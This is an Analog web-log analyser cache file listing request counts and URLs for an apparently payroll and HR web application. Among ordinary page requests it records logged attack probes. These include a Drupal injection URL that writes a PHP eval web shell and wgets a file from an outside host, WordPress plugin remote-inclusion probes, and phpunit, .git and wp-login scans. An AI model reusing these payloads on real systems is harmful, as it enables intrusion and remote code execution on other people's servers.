CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!
T	0	0	8488	121	750	142	90387841
D	24745758	25968487
17184	159	75	0	583915
17184	160	13	0	92563
17184	161	57	1	474266
17184	218	1	0	1646
17185	8	7	0	393
17186	179	31	0	265729
17225	142	67	1	570063
17225	167	73	3	564089
17225	171	62	1	536574
17225	172	17	0	44429
17225	173	8	0	31043
17225	174	15	0	63550
17225	175	6	0	27334
17225	176	1	0	3968
17225	177	16	0	80368
17225	178	10	2	61832
17225	179	4	0	29512
17226	112	66	1	551572
17226	113	5	0	23368
17226	128	1	0	3769
17235	252	1	0	6890
17235	274	1	0	6890
17243	131	66	1	576118
17243	132	8	1	28746
17243	136	2	0	9833
17243	138	4	0	18172
17243	139	20	0	85247
17243	140	5	0	18275
17243	141	3	0	14383
17243	142	24	0	95809
17243	143	8	0	38130
17243	144	2	0	10408
17243	145	17	0	74710
17243	146	6	1	19023
17243	147	66	1	772322
17243	148	10	1	54401
17243	149	5	0	25488
17243	150	25	0	141532
17243	151	14	0	85688
17243	152	18	1	172969
17243	153	31	0	268041
17243	154	4	0	18659
17243	157	2	1	5766
17243	158	5	0	20278
17243	159	16	2	78750
17243	170	3	0	24820
17243	179	13	0	67331
17243	180	6	0	38175
17243	188	7	1	24709
17243	189	9	0	20776
17243	198	1	0	3522
17243	199	38	0	156727
17243	200	15	1	344716
17243	201	5	0	10653
17243	203	1	0	1685
17244	115	33	0	267611
17247	107	32	0	267418
17247	108	4	0	6706
17247	195	11	0	27572
17247	196	81	3	632125
17247	197	14	0	58858
17247	198	16	1	62526
17247	199	46	2	411158
17247	200	14	0	73379
17247	201	23	0	120480
17247	202	10	0	39332
17247	203	33	1	129984
17247	204	23	1	103940
17247	205	18	0	168138
17247	210	5	1	79371
17249	172	15	1	150957
17249	173	1	0	2244
17254	131	74	2	673821
17254	132	2	0	12914
17255	136	2	1	3916
17255	137	15	1	57561
17255	138	13	1	164192
17255	139	66	1	550398
17255	140	2	0	8653
17255	141	7	0	34168
17255	142	18	0	118000
17255	143	5	0	22794
17255	144	2	0	4307
17255	145	7	1	29224
17255	146	3	0	18656
17255	147	20	0	78517
17255	148	17	0	117783
17255	149	3	0	26240
17255	150	10	0	57616
17255	151	9	0	53015
17255	152	12	0	48997
17255	164	1	0	4330
17255	179	4	1	11177
17255	180	3	0	46795
17255	186	2	0	18180
17256	172	24	1	156682
17256	173	4	0	32096
17256	174	25	1	120688
17256	175	10	0	26284
17256	176	27	0	141285
17256	177	5	0	39213
17256	178	15	0	68631
17256	179	11	0	53064
17256	180	17	0	17930
17256	181	8	0	0
17256	182	14	3	25111
17256	183	11	1	42914
17256	184	15	0	71469
17256	185	80	1	107317
17256	186	5	0	27629
17256	187	16	1	78085
17256	188	3	0	12755
17256	189	18	0	84315
17256	192	24	1	106921
17256	193	1	0	9367
17256	196	7	1	30682
17256	197	14	1	96984
17256	200	2	2	7834
17256	201	10	0	50555
17256	204	8	0	117948
17256	205	8	1	79101
17256	206	31	0	211151
17256	207	11	0	46394
17256	208	9	0	87278
17256	211	4	0	31679
17257	101	2	1	5790
17257	119	18	4	70402
17257	120	19	0	155302
17257	124	1	1	3906
17260	134	64	1	550612
17260	135	45	0	396492
17260	146	5	1	20797
17261	10	7	0	393
17263	174	31	0	265732
17263	175	36	1	299542
17269	142	69	1	559361
17270	218	1	0	6890
17270	237	1	0	6890
17271	148	2	1	3919
17282	145	27	1	174222
17282	146	1	0	9360
17283	164	11	1	48595
17283	168	5	0	18172
17283	173	133	2	1312907
17283	174	12	0	144047
17284	137	2	1	7498
17284	138	1	0	5350
17284	139	16	1	164040
17284	140	16	0	60830
17284	141	8	0	35851
17284	142	12	0	55673
17284	143	3	1	10097
17284	144	24	0	120876
17284	145	4	0	23734
17284	188	1	0	3767
17290	114	63	1	539898
17318	129	61	1	534547
17318	130	4	0	17678
17318	131	16	0	69742
17318	132	32	1	312964
17318	133	22	0	213714
17318	134	84	1	630698
17318	135	31	1	119227
17318	136	3	0	13257
17318	137	20	0	90884
17318	138	27	0	103865
17318	139	13	0	61787
17318	144	1	1	3919
17318	150	2	0	3984
17318	217	46	1	401082
17326	247	1	0	6890
17337	10	7	0	393
17348	161	71	1	592276
17348	162	8	0	80517
17354	268	1	0	6762
17355	156	10	1	150797
17355	157	3	0	14245
17355	158	5	0	22667
17355	160	9	0	43469
17355	161	4	0	23796
17355	162	13	0	51239
17355	163	28	0	150173
17355	168	3	0	9272
17355	172	14	0	54538
17355	175	12	1	79189
17355	176	99	2	679045
17355	177	38	0	157861
17355	178	1	0	3997
17355	179	8	0	36871
17355	180	69	1	549985
17355	181	2	0	4148
17355	182	32	1	136984
17355	183	5	0	81054
17374	181	64	0	534846
17376	128	52	1	504318
17376	129	8	0	27814
17376	130	4	0	16723
17376	131	4	0	17334
17376	132	7	0	30108
17376	133	17	0	68580
17376	135	1	0	3593
17376	136	13	0	54968
17376	140	2	0	11766
17376	143	2	0	12354
17376	144	21	2	119020
17376	145	49	1	338906
17376	146	14	0	105633
17376	147	1	0	4168
17376	148	5	0	31152
17376	149	10	0	175152
17376	151	1	0	9931
17390	82	1	0	6762
17413	10	7	0	527
17416	238	1	0	6762
17417	2	1	0	6762
17451	278	1	0	6762
17482	131	1	0	6762
17482	150	1	0	6762
17488	257	7	0	523
17500	180	73	1	869656
17500	197	2	0	64201
17509	2	1	0	6762
17536	210	1	0	6762
17536	230	1	0	6762
17540	193	30	0	270846
17540	194	30	1	365457
17540	205	3	0	78506
17540	206	1	0	6762
17541	133	4	1	226514
17541	137	2	0	117288
17541	140	5	0	279583
17541	141	74	1	1125727
17541	142	9	0	442658
17541	143	6	0	191262
17564	257	7	0	525
17566	239	1	0	6762
17615	124	33	0	277756
17615	126	4	0	13672
17618	138	64	1	713800
17618	139	30	0	270846
17618	161	61	1	630187
17618	162	30	0	270846
17619	153	30	0	270846
17619	189	70	3	988296
17627	23	1	0	6762
17640	257	7	0	525
17645	140	31	0	270846
17645	146	2	0	6910
17645	149	31	1	365439
17645	151	10	0	165283
17645	152	24	0	568797
17645	153	20	0	486428
17645	154	18	0	448458
17645	155	14	0	319136
17645	175	14	0	400775
17645	176	4	0	121914
17645	177	4	0	123246
17645	178	4	0	124568
17645	179	8	0	242428
17645	180	4	0	84103
17645	182	6	0	141366
17645	190	6	0	140672
17645	192	20	0	479930
17645	193	1	0	10069
17645	194	26	0	729249
17645	195	21	0	542501
17645	196	2	0	58741
17645	197	6	0	99160
17647	147	83	1	1137186
17647	148	29	0	703660
17647	149	29	0	843037
17647	150	26	0	623158
17647	152	2	0	6762
17655	274	1	0	6762
17656	115	1	0	6762
17659	79	88	0	1146663
17663	196	74	1	859725
17663	197	8	0	207893
17663	203	2	0	6762
17677	200	79	1	1112359
17677	201	22	0	598521
17677	202	10	0	258933
17677	203	2	0	6762
17680	135	31	0	270846
17680	136	71	1	833446
17680	137	49	0	988214
17680	138	93	0	1764793
17680	139	10	0	157647
17680	140	14	0	283913
17680	142	8	0	93939
17686	138	1	0	6762
17687	269	1	0	6762
17688	172	67	1	625155
17688	173	84	0	808239
17688	174	111	0	1076320
17688	175	15	0	83442
17691	113	116	1	1299084
17691	114	151	0	1956247
17691	115	41	0	562175
17691	117	107	0	1407318
17709	115	31	0	270846
17709	116	224	1	2961454
17709	117	1	0	8149
17709	118	19	0	189655
17717	25	7	0	525
17717	127	1	0	6762
17718	208	1	0	6762
17728	170	1	0	6762
17730	174	1	0	6762
17733	175	74	1	905008
17733	238	1	0	6762
17738	109	1	0	6762
17738	110	61	1	629338
17738	111	6	0	109603
17738	112	18	0	571979
17738	113	32	0	977578
17738	114	15	0	401207
17747	154	45	1	468269
17747	155	33	0	758502
17747	156	4	0	124735
17747	160	1	0	6762
17750	189	60	1	636100
17750	193	1	0	29157
17750	202	1	0	29841
17750	205	6	3	337593
17750	206	4	0	27492
17751	215	33	0	284666
17753	114	1	0	6762
17753	217	1	0	6762
17769	123	66	1	823546
17769	135	5	0	253181
17769	140	1	0	70243
17769	143	2	0	64047
17769	144	13	0	598723
17769	145	29	0	1025785
17769	146	1	0	6762
17777	241	1	0	6762
17785	110	31	0	278989
17785	111	344	1	3514697
17785	112	286	0	2927103
17785	113	215	1	2313207
17785	115	25	0	193394
17792	177	1	0	6762
17792	189	1	0	6762
17793	25	5	0	384
17801	135	79	1	1571164
17801	136	1	0	6762
17808	23	1	0	6762
17808	92	1	0	6762
17809	199	1	0	6762
17812	61	1	0	6762
17818	211	1	0	24
17827	124	67	1	925094
17827	125	17	0	960159
17827	126	2	0	13933
17831	155	1	0	24
17835	115	1	0	6762
17863	182	63	0	555512
17869	25	5	0	384
17871	40	1	0	6762
17884	106	1	0	6762
17914	132	1	0	1646
17915	217	1	0	4667
17928	283	1	0	15464
17929	213	1	0	4499
17945	2	3	0	228
17946	138	106	1	1363442
17946	139	38	1	433188
17946	160	55	0	242930
17958	130	1	0	15462
17960	177	1	0	4663
17989	139	1	0	15462
17995	73	1	0	21562
17995	165	2	0	12792
17997	246	2	0	48
18000	9	1	0	4540
18003	242	1	0	24
18004	100	1	0	24
18004	174	1	0	24
18005	116	1	0	24
18006	145	1	0	4654
18010	46	1	0	24
18010	219	1	0	24
18019	267	1	0	24
18020	113	1	0	24
18021	61	2	0	4532
18026	283	1	0	5628
18027	94	1	0	7246
18027	130	1	0	24
18027	191	1	0	24
18032	109	72	1	947014
18032	182	100	1	1339270
18033	64	1	0	24
18033	193	1	0	24
1	2	0	0	0	24992115	0	0	24981931	0	0	78880	/payroll-pdfs?all=true&sub=6-2017&main=Branches&main=Branches
1	2	0	0	0	24847963	0	0	24847928	0	0	7867	/loans/2017
1	60	0	0	0	25966992	0	0	24745759	0	0	126720	/admin/layout4/scripts/demo.js
1	57	0	0	0	25671510	0	0	24836708	0	0	675373	/payroll-print
1	53	0	2	0	25409557	24830863	0	24804839	24804865	0	289628	/deductions
1	15	0	0	0	25200904	0	0	24847951	0	0	87008	/loans/03-2017
1	1	0	0	0	25429357	0	0	25429357	0	0	162	/img/accordion-plusminus.png
1	1	0	0	0	24992061	0	0	24992061	0	0	3756	/assignments/19/edit
1	135	0	1	0	25671503	25610966	0	24804874	25610966	0	4807501	/contracts
1	8	8	10	0	24981927	25130833	0	24839423	24806002	0	31344	/?196.207.135.93
1	1	0	0	0	24746440	0	0	24746440	0	0	53	/192184367F677E020B2B5F14FCF55080.txt
1	2	0	0	0	24849587	0	0	24849523	0	0	10407	/loans/2/edit
1	0	0	0	9	0	0	25706218	0	0	25705466	0	/scripts/cfformhistory.cfm
1	1	0	0	0	25429357	0	0	25429357	0	0	312	/img/portlet-remove-icon.png
1	1	0	0	0	24830717	0	0	24830717	0	0	3716	/employee-deductions/3/edit
1	0	0	0	1	0	0	24836701	0	0	24836701	0	/payroll-pdfs?all=true&sub=2-2017&main=Branches&main=Branches
1	0	0	2	0	0	25913630	0	0	25913627	0	0	/user/register/?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax
1	1	0	0	0	25429357	0	0	25429357	0	0	3028	/img/social/deviantart.png
1	0	0	1	0	0	24836669	0	0	24836669	0	0	/employee-types/2
1	3	0	0	0	25022102	0	0	24847885	0	0	10934	/employee-types/1
1	4	0	0	0	24830616	0	0	24804866	0	0	20442	/payment-methods/create
1	1	0	0	0	24889900	0	0	24889900	0	0	3767	/employee-types?196.207.135.93
1	1	0	0	0	25429357	0	0	25429357	0	0	3358	/img/social/rss.png
1	2	0	0	0	25543287	0	0	25543287	0	0	35478	/payroll-pdf/246
1	6	0	0	0	25022187	0	0	25022160	0	0	27324	/payroll/0?sub=7-2017&main=Branches
1	0	0	1	2	0	25913626	25913629	0	25913626	25913626	0	/webconfig.txt.php
1	1	0	0	0	25429357	0	0	25429357	0	0	3124	/img/social/spotify.png
1	0	0	2	0	0	25459889	0	0	24938598	0	0	/employee-allowances/1
1	2	0	0	0	25543285	0	0	25543285	0	0	35478	/payroll-pdf/226
1	316	0	116	12	25671509	25671508	24830922	24804886	24804886	24830648	8819228	/payroll
1	59	0	0	0	25966991	0	0	24745766	0	0	3213472	/plugins/simple-line-icons/fonts/Simple-Line-Icons.woff
1	2	0	0	0	24938568	0	0	24889683	0	0	9005	/payroll/0?sub=4-2017&main=Branches
1	0	0	0	1	0	0	25913165	0	0	25913165	0	/login/wp/wp-includes/wlwmanifest.xml
1	1	0	0	0	24888391	0	0	24888391	0	0	19057	/payroll-pdf/221
1	54	0	0	0	25966991	0	0	24745766	0	0	173888	/plugins/bootstrap-switch/js/bootstrap-switch.min.js
1	2	0	0	0	25412425	0	0	24836673	0	0	2254	/plugins/datatables/media/images/sort_desc.png
1	0	0	1	0	0	24804861	0	0	24804861	0	0	/departments?type=department
1	2	0	0	0	25022187	0	0	25022170	0	0	7107	/payroll/0?all=true&sub=7-2017&main=Branches
1	1	1	5	0	24889647	25174739	0	24889647	24991100	0	3917	/?154.70.33.249
1	1	0	0	0	24859595	0	0	24859595	0	0	17531	/payroll-pdf/204
1	0	0	1	7	0	24888390	24888389	0	24888390	24888362	0	/finalize-payroll?date=2017-03-31
1	0	0	0	1	0	0	25913631	0	0	25913631	0	/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://customcoverinc.com/images/banners/shopreadme.txt&wpaa=phpinfo();exit();
1	0	0	3	0	0	25913629	0	0	25913626	0	0	/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=echo+'Vuln!!+patch+it+Now!'+>+vuln.htm%3B+echo+'Vuln!!<%3Fphp+@eval($_POST['pass'])+%3F>'>+sites/default/files/vuln.php%3B+echo+'Vuln!!<%3Fphp+@eval($_POST['pass'])+%3F>'>+vuln.php%3B+cd+sites/default/files/%3B+echo+'AddType+application/x-httpd-php+.jpg'+>+.htaccess%3B+wget+'http://40k.waszmann.de/Deutsch/images/up.php'
1	0	0	1	0	0	25409778	0	0	25409778	0	0	/finalize-payroll?date=2018-03-31
1	0	0	1	0	0	25719055	0	0	25719055	0	0	/wordpress/
1	0	0	1	0	0	25719055	0	0	25719055	0	0	/wp/
1	1	0	0	0	24804860	0	0	24804860	0	0	779	/departments/create?type=department
1	1	0	0	0	25429357	0	0	25429357	0	0	122092	/plugins/font-awesome/fonts/fontawesome-webfont.ttf?v=4.3.0
1	1	0	0	0	24850681	0	0	24850681	0	0	19057	/payroll-pdf/165
1	1	0	0	0	25184008	0	0	25184008	0	0	64	/.well-known/pki-validation/8E13F0018498DC8A69FF28D94A5BC28B.txt?196.207.135.93
1	3	0	0	0	24850680	0	0	24849680	0	0	57165	/payroll-pdf/164
1	0	0	0	1	0	0	25717477	0	0	25717477	0	/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php?165.227.75.29
1	3	0	0	0	25587977	0	0	25366222	0	0	20286	/login?159.89.188.122
1	1	0	0	0	25429357	0	0	25429357	0	0	23424	/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff
1	1	0	0	0	25074773	0	0	25074773	0	0	77	/.well-known/pki-validation/3D9187F5F43C382CA557178A4137CFA2.txt
1	0	0	1	0	0	25022170	0	0	25022170	0	0	/delete-payroll?date=2017-07-31
1	0	0	0	1	0	0	25666681	0	0	25666681	0	/wordpress/wp-login.php
1	16	0	4	0	25561027	24836662	0	24804712	24804713	0	114904	/users
1	1	0	1	0	25588087	25610961	0	25588087	25610961	0	28209	/payroll/487
1	1	0	1	0	25588087	25610961	0	25588087	25610961	0	28207	/payroll/486
1	1	0	1	0	25588087	25610961	0	25588087	25610961	0	28204	/payroll/485
1	1	0	0	0	25588088	0	0	25588088	0	0	28200	/payroll/484
1	11	0	0	0	25671507	0	0	24804887	0	0	200710	/policies/6/edit
1	0	0	1	0	0	25610960	0	0	25610960	0	0	/payroll/483
1	1	0	1	0	25588086	25610960	0	25588086	25610960	0	28205	/payroll/482
1	1	0	0	0	24898170	0	0	24898170	0	0	1649	/login?154.70.33.249
1	1	0	0	0	25588088	0	0	25588088	0	0	28202	/payroll/481
1	5	0	0	0	25409555	0	0	24806003	0	0	72487	/deductions/1/edit
1	1	0	0	0	25588088	0	0	25588088	0	0	28201	/payroll/480
1	0	0	1	0	0	25610959	0	0	25610959	0	0	/payroll/479
1	0	0	1	0	0	25610960	0	0	25610960	0	0	/payroll/478
1	0	0	1	0	0	25610959	0	0	25610959	0	0	/payroll/477
1	54	0	0	0	25671509	0	0	24836707	0	0	893276	/payroll-generate
1	0	0	1	1	0	25610959	25610959	0	25610959	25610959	0	/payroll/476
1	1	0	0	0	24830919	0	0	24830919	0	0	7175	/grades/1/edit
1	0	0	1	0	0	25409711	0	0	25409711	0	0	/worked?165.227.75.29
1	7	0	0	0	24889666	0	0	24830685	0	0	46721	/deductions/4/edit
1	0	0	0	1	0	0	25908489	0	0	25908489	0	/vendor/phpunit/phpunit/build.xml?165.227.75.29
1	0	0	1	0	0	25610959	0	0	25610959	0	0	/payroll/474
1	0	0	1	0	0	25610960	0	0	25610960	0	0	/payroll/473
1	1	0	1	0	25556460	25610959	0	25556460	25610959	0	28020	/payroll/472
1	4	0	0	0	24938583	0	0	24849501	0	0	308023	/payroll-pdfs?all=true&main=Branches&main=Branches
1	0	0	1	0	0	25610958	0	0	25610958	0	0	/payroll/470
1	1	0	0	0	24849629	0	0	24849629	0	0	17541	/payroll-pdf/118
1	106	0	0	0	25966992	0	0	24745759	0	0	560629	/plugins/font-awesome/css/font-awesome.min.css
1	1	0	0	0	24849625	0	0	24849625	0	0	15375	/payroll-pdf/117
1	1	0	0	0	25429357	0	0	25429357	0	0	3217	/img/social/behance.png
1	1	0	0	0	25200903	0	0	25200903	0	0	34074	/loans/details/4
1	1	0	0	0	25556459	0	0	25556459	0	0	28020	/payroll/461
1	0	0	1	0	0	25543286	0	0	25543286	0	0	/payroll/459
1	9	0	0	0	25966992	0	0	24830659	0	0	1009467	/_debugbar/assets/javascript?v=1473948119
1	156	0	0	0	25966992	0	0	24745759	0	0	496188	/plugins/select2/select2.css
1	1	0	0	0	25536397	0	0	25536397	0	0	28010	/payroll/458
1	6	0	0	0	24849523	0	0	24847952	0	0	28412	/loans/details/2
1	1	0	0	0	25610957	0	0	25610957	0	0	28206	/payroll/457
1	6	0	0	0	25200904	0	0	24847951	0	0	57754	/loans/details/1
1	1	0	0	0	24849627	0	0	24849627	0	0	18223	/payroll-pdf/108
1	28	0	3	0	25459889	25459884	0	24804862	24804863	0	323063	/allowances
1	5	0	0	0	25610954	0	0	25429357	0	0	40715	/img/syncfusion-icons.png
1	1	0	0	0	25471590	0	0	25471590	0	0	28010	/payroll/455
1	2	0	0	0	25459902	0	0	25459893	0	0	56024	/payroll/454
1	1	0	0	0	25459890	0	0	25459890	0	0	28024	/payroll/453
1	1	0	1	0	25459886	25459890	0	25459886	25459890	0	28024	/payroll/452
1	0	0	1	0	0	25459885	0	0	25459885	0	0	/payroll/451
1	0	0	1	0	0	25475610	0	0	25475610	0	0	/payroll/450
1	123	0	0	0	25966992	0	0	24745759	0	0	266563	/plugins/uniform/css/uniform.default.css
1	1	0	0	0	25622048	0	0	25622048	0	0	64	/.well-known/pki-validation/8917243AEFED9613AFC10FFB61112B3A.txt?165.227.75.29
1	1	0	0	0	25556458	0	0	25556458	0	0	28020	/payroll/443
1	0	0	1	0	0	25459893	0	0	25459893	0	0	/payroll/442
1	0	0	1	0	0	25459893	0	0	25459893	0	0	/payroll/441
1	0	0	0	1	0	0	25913631	0	0	25913631	0	/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.tekmat.net/wp-content/uploads/2014/04/jpg.txt&wpaa=phpinfo();
1	4	0	0	0	25622048	0	0	25622048	0	0	320	/.well-known/pki-validation/AC93FC58CBC6853FEE3B63194C6A5C40.txt
1	0	0	1	0	0	25459893	0	0	25459893	0	0	/payroll/439
1	1	0	0	0	25429357	0	0	25429357	0	0	330	/img/portlet-config-icon.png
1	0	0	1	0	0	25471589	0	0	25471589	0	0	/payroll/438
1	21	0	0	0	24849679	0	0	24836674	0	0	86647	/payroll/0?sub=2-2017
1	24	0	0	0	25556459	0	0	25459885	0	0	1035569	/payroll/0?sub=5-2018
1	1	0	0	0	24938584	0	0	24938584	0	0	4494	/payroll/0?sub=5-2017
1	16	0	0	0	25634116	0	0	25588086	0	0	596641	/payroll/0?sub=8-2018
1	18	0	0	0	25966991	0	0	24804860	0	0	9962	/plugins/select2/select2.png
1	51	0	0	0	25843044	0	0	24745766	0	0	47285	/admin/layout4/img/sidebar-toggle-light.png
1	1	0	0	0	25556457	0	0	25556457	0	0	28020	/payroll/425
1	0	0	1	0	0	24830633	0	0	24830633	0	0	/employee-payment-methods/1
1	1	0	0	0	25435703	0	0	25435703	0	0	28206	/payroll/419
1	0	0	0	1	0	0	25913165	0	0	25913165	0	/login/site/wp-includes/wlwmanifest.xml
1	1	0	0	0	24849533	0	0	24849533	0	0	5293	/contracts/12/edit
1	0	0	0	1	0	0	25913165	0	0	25913165	0	/login/cms/wp-includes/wlwmanifest.xml
1	2	0	0	0	25459892	0	0	25409568	0	0	74405	/contracts/15/edit
1	0	0	1	0	0	25409773	0	0	25409773	0	0	/payroll/395
1	0	0	1	0	0	24849576	0	0	24849576	0	0	/employee-deductions/58
1	0	0	1	0	0	24849576	0	0	24849576	0	0	/employee-deductions/54
1	1	0	0	0	25556455	0	0	25556455	0	0	28020	/payroll/390
1	5	0	0	0	25610961	0	0	25409567	0	0	186315	/contracts/18/edit
1	1	0	0	0	25409774	0	0	25409774	0	0	28011	/payroll/400
1	0	0	2	0	0	25412427	0	0	25409786	0	0	/employees/27
1	1	0	0	0	25435708	0	0	25435708	0	0	28206	/payroll/384
1	0	0	1	0	0	24849535	0	0	24849535	0	0	/employee-deductions/47
1	4	0	0	0	25610965	0	0	25409677	0	0	148802	/contracts/22/edit
1	1	0	0	0	25259753	0	0	25259753	0	0	39159	/employees/21
1	0	0	1	0	0	24992084	0	0	24992084	0	0	/employees/19
1	1	0	0	0	25455884	0	0	25455884	0	0	37295	/contracts/25/edit
1	0	0	1	0	0	24847912	0	0	24847912	0	0	/employee-deductions/41
1	0	0	1	0	0	25719055	0	0	25719055	0	0	/blog/
1	0	0	0	4	0	0	25665578	0	0	25665578	0	/.DS_Store
1	1	0	2	0	24991984	24991984	0	24991984	24938609	0	4600	/employees/16
1	8	0	0	0	25022094	0	0	24830611	0	0	32451	/employees/1/edit
1	4	0	0	0	24965333	0	0	24965333	0	0	212	/80EE3373FC864854BD761F822CC051B0.txt
1	2	0	0	0	25610966	0	0	25455886	0	0	74620	/contracts/28/edit
1	4	0	3	0	24849621	24849602	0	24849600	24849600	0	17855	/employees/14
1	56	0	0	0	25966991	0	0	24745766	0	0	13356	/plugins/morris/morris.css
1	0	0	1	0	0	24849536	0	0	24849536	0	0	/employees/13
1	1	0	0	0	25429357	0	0	25429357	0	0	60744	/plugins/font-awesome/fonts/fontawesome-webfont.eot?
1	0	0	1	0	0	24849536	0	0	24849536	0	0	/employees/12
1	0	0	1	0	0	24855074	0	0	24855074	0	0	/employee-deductions/33
1	2	0	0	0	24868071	0	0	24868071	0	0	9042	/employees/11
1	1	0	1	0	24849622	24847906	0	24849622	24847906	0	4511	/employees/10
1	1	0	0	0	24992078	0	0	24992078	0	0	4398	/employees/4/edit
1	1	0	0	0	24804860	0	0	24804860	0	0	678	/departments/create
1	2	0	0	0	25671509	0	0	25671508	0	0	65652	/payroll/0?sub=10-2018
1	0	0	1	0	0	24855074	0	0	24855074	0	0	/employee-deductions/29
1	1	0	0	0	25259755	0	0	25259755	0	0	28210	/payroll/366
1	65	0	0	0	25966992	0	0	24745759	0	0	491855	/plugins/excanvas.min.js
1	1	0	0	0	25022104	0	0	25022104	0	0	4402	/employees/7/edit
1	0	0	1	0	0	24855074	0	0	24855074	0	0	/employee-deductions/25
1	0	0	1	0	0	24855074	0	0	24855074	0	0	/employee-deductions/24
1	1	0	0	0	25022184	0	0	25022184	0	0	3589	/payroll/357
1	120	0	0	0	25966992	0	0	24745759	0	0	412764	/admin/layout4/scripts/layout.js
1	1	0	0	0	25402888	0	0	25402888	0	0	64	/.well-known/pki-validation/C5A817EA6CF2F2901CE0D8A7D675B6D3.txt?165.227.75.29
1	0	0	1	0	0	24855074	0	0	24855074	0	0	/employee-deductions/16
1	57	0	0	0	25966991	0	0	24745766	0	0	21330	/plugins/bootstrap-modal/css/bootstrap-modal-bs3patch.css
1	1	0	0	0	24746440	0	0	24746440	0	0	64	/26426.BIN_AUTOSSL_CHECK_PL__.njIH9W4N.cpaneldcv
1	119	0	0	0	25966992	0	0	24745759	0	0	3927040	/plugins/jquery.min.js
1	138	0	0	0	25966992	0	0	24745759	0	0	5733315	/css/components-rounded.css
1	3	0	0	0	25459889	0	0	24938596	0	0	35360	/employee-allowances/1/edit
1	0	0	2	0	0	25536396	0	0	25475608	0	0	/payroll?159.89.188.122
1	48	0	0	0	25671502	0	0	24804712	0	0	53392	/plugins/datatables/media/images/sort_both.png
1	1	0	0	0	25429357	0	0	25429357	0	0	3004	/img/social/linkedin.png
1	5	0	0	0	24938614	0	0	24938608	0	0	20031	/worked/05-2017
1	54	0	0	0	25966991	0	0	24745766	0	0	150904	/css/fullcalendar.min.css
1	0	0	0	1	0	0	25711187	0	0	25711187	0	/.git/config?165.227.75.29
1	1	0	0	0	25512608	0	0	25512608	0	0	64	/.well-known/pki-validation/2F8C0A2B063833D2B0388562C103C090.txt?159.89.188.122
1	4	0	0	0	24836707	0	0	24836688	0	0	14066	/payroll/0?all=true&sub=2-2017
1	0	0	1	0	0	24889683	0	0	24889683	0	0	/delete-payroll?date=2017-04-30
1	1	0	0	0	24938588	0	0	24938588	0	0	44542	/payroll-pdfs?all=true&sub=5-2017&main=Branches&main=Branches
1	0	0	0	1	0	0	25913165	0	0	25913165	0	/login/wordpress/wp-includes/wlwmanifest.xml
1	5	0	0	2	24981928	0	24830670	24836732	0	24830650	282678	/payroll-pdfs?all=true
1	1	0	0	0	25429357	0	0	25429357	0	0	3169	/img/social/blogger.png
1	2	0	0	0	25840811	0	0	25840811	0	0	164	/.well-known/pki-validation/76F710AA2C9896B0019604799351C61B.txt
1	0	0	1	0	0	25412427	0	0	25412427	0	0	/delete-payroll?date=2018-04-30
1	1	0	0	0	24746440	0	0	24746440	0	0	64	/26426.BIN_AUTOSSL_CHECK_PL__.Dg7bpz57.cpaneldcv
1	119	0	0	0	25966992	0	0	24745759	0	0	90558	/plugins/jquery.cokie.min.js
1	2	0	0	0	24849518	0	0	24836669	0	0	7559	/employee-types/2/edit
1	1	0	0	0	25293448	0	0	25293448	0	0	64	/.well-known/pki-validation/AECFB6ABDE332F352634F90CAC36B2F3.txt
1	55	0	0	0	25966991	0	0	24745766	0	0	12667	/admin/pages/scripts/tasks.js
1	1	0	0	0	24830617	0	0	24830617	0	0	5271	/contracts/2/edit
1	53	0	0	0	25966991	0	0	24745766	0	0	1576104	/js/fullcalendar.min.js
1	4	0	0	0	24992014	0	0	24847917	0	0	21224	/contracts/5/edit
1	1	0	0	0	24965333	0	0	24965333	0	0	64	/AE6D10049A42C45853C4A6F02E1FC093.txt
1	4	0	0	0	24746441	0	0	24746440	0	0	212	/B3119F8F68FD53947159054CA312DB81.txt
1	0	0	1	1	0	25913628	25913631	0	25913628	25913631	0	/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.acne-school.ru//sites/all/modules/webform/tests/subform.txt&wpaa=phpinfo();exit();
1	11	0	0	0	25543277	0	0	24830687	0	0	153564	/contracts/8/edit
1	1	0	0	0	25429357	0	0	25429357	0	0	345	/img/portlet-reload-icon.png
1	0	0	0	4	0	0	25720783	0	0	25658978	0	/wp-login.php?165.227.75.29
1	3	0	0	3	24855079	0	24836692	24849668	0	24836689	147645	/payroll-pdfs?all=true&sub=3-2017
1	5	0	0	0	24938604	0	0	24849600	0	0	21863	/employees/14/edit
1	1	0	0	0	24836701	0	0	24836701	0	0	3698	/worked/1/edit
1	6	0	0	0	25022122	0	0	24847917	0	0	31002	/loans/create
1	1	0	0	0	25200988	0	0	25200988	0	0	57439	/contracts?165.227.75.29
1	54	0	0	0	25966991	0	0	24745766	0	0	455936	/plugins/bootstrap-datepicker/js/bootstrap-datepicker.min.js
1	1	0	0	0	25429357	0	0	25429357	0	0	3105	/img/social/stumbleupon.png
1	0	0	0	1	0	0	25718450	0	0	25718450	0	/wp-admin/admin-ajax.php?165.227.75.29
1	12	0	0	0	24992062	0	0	24804839	0	0	22081	/departments
1	1	0	0	0	25543287	0	0	25543287	0	0	27999	/payroll/246
1	55	0	0	0	25966991	0	0	24745766	0	0	140715	/plugins/bootstrap-toastr/toastr.min.css
1	0	0	1	0	0	24830919	0	0	24830919	0	0	/grades/1
1	133	0	0	0	25966992	0	0	24745759	0	0	461775	/plugins/jquery.blockui.min.js
1	24	0	2	0	25588081	24836669	0	24804874	24804874	0	116689	/employee-types
1	4	0	0	0	25412420	0	0	25409785	0	0	134601	/employees/27/edit
1	1	0	0	0	25429357	0	0	25429357	0	0	269	/img/portlet-collapse-icon.png
1	1	0	0	0	24849542	0	0	24849542	0	0	3747	/employee-deductions/53/edit
1	1	0	0	0	25543285	0	0	25543285	0	0	27999	/payroll/226
1	1	0	0	0	25429357	0	0	25429357	0	0	3025	/img/social/github.png
1	1	0	0	0	24992101	0	0	24992101	0	0	1127	/plugins/datatables/media/images/sort_desc.png?196.207.135.93
1	1	0	0	0	25840811	0	0	25840811	0	0	64	/.well-known/pki-validation/EF77157A807D9EB15C586C969AED4E19.txt?165.227.75.29
1	1	0	0	0	24888391	0	0	24888391	0	0	3594	/payroll/221
1	0	0	0	1	0	0	25720783	0	0	25720783	0	/xmlrpc.php
